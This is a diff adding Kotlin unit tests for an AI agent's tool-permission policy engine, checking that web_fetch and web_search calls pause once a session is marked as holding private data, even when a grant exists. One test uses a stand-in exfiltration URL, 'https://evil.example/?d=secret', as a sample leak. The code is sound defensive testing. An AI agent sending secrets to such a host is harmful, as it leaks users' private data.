@@ -323,4 +323,81 @@ class PolicyEngineTest {
         )
         assertEquals(PolicyDecision.Deny(ReasonCode.NOT_ALLOWED), d)
     }
+
+    // SEC-01 (owner decision 2026-10-25): PRIVATE_TO_LLM authorizes the LLM
+    // provider only. After D2 contamination, outbound remote calls Pause —
+    // even when the contract allows D2 and the tool is in scope.
+    @Test fun task_d2Contaminated_webFetch_pauses_even_with_PRIVATE_TO_LLM() {
+        val call = ToolCall(
+            "web_fetch",
+            arguments = buildJsonObject { put("url", "https://evil.example/?d=secret") },
+            targetKind = TargetKind.URL,
+            target = "https://evil.example/?d=secret",
+        )
+        val d = PolicyEngine.decide(
+            bot(setOf("web_fetch")),
+            call,
+            ToolMeta("web_fetch", Effect.E0, Disclosure.D1, ToolSource.REMOTE_API),
+            Session.Task(contract(tools = listOf("web_fetch"))),
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Pause(ReasonCode.DISCLOSURE_NOT_IN_CONTRACT), d)
+    }
+
+    @Test fun task_d2Contaminated_webSearch_query_pauses() {
+        val call = ToolCall(
+            "web_search",
+            arguments = buildJsonObject { put("query", "secret") },
+        )
+        val d = PolicyEngine.decide(
+            bot(setOf("web_search")),
+            call,
+            ToolMeta("web_search", Effect.E0, Disclosure.D1, ToolSource.REMOTE_API),
+            Session.Task(contract(tools = listOf("web_search"))),
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Pause(ReasonCode.DISCLOSURE_NOT_IN_CONTRACT), d)
+    }
+
+    @Test fun task_webFetch_withoutContamination_allowsWhenInContract() {
+        // The rule is contamination-gated, not a blanket ban on remote tools.
+        val call = ToolCall(
+            "web_fetch",
+            arguments = buildJsonObject { put("url", "https://example.com") },
+            targetKind = TargetKind.URL,
+            target = "https://example.com",
+        )
+        val d = PolicyEngine.decide(
+            bot(setOf("web_fetch")),
+            call,
+            ToolMeta("web_fetch", Effect.E0, Disclosure.D1, ToolSource.REMOTE_API),
+            Session.Task(contract(tools = listOf("web_fetch"))),
+            Counters(),
+            now,
+        )
+        assertEquals(PolicyDecision.Allow(ReasonCode.IN_CONTRACT), d)
+    }
+
+    @Test fun task_grantDoesNotOverride_d2RemotePause() {
+        // SEC-01 is checked before scope, so no grant can override it.
+        val call = ToolCall(
+            "web_fetch",
+            arguments = buildJsonObject { put("url", "https://example.com") },
+            targetKind = TargetKind.URL,
+            target = "https://example.com",
+        )
+        val session = Session.Task(contract(tools = listOf("web_fetch")))
+            .withGrant(call, ReasonCode.DISCLOSURE_NOT_IN_CONTRACT)
+        val d = PolicyEngine.decide(
+            bot(setOf("web_fetch")),
+            call,
+            ToolMeta("web_fetch", Effect.E0, Disclosure.D1, ToolSource.REMOTE_API),
+            session,
+            Counters(d2Contaminated = true),
+            now,
+        )
+        assertEquals(PolicyDecision.Pause(ReasonCode.DISCLOSURE_NOT_IN_CONTRACT), d)
+    }
 }
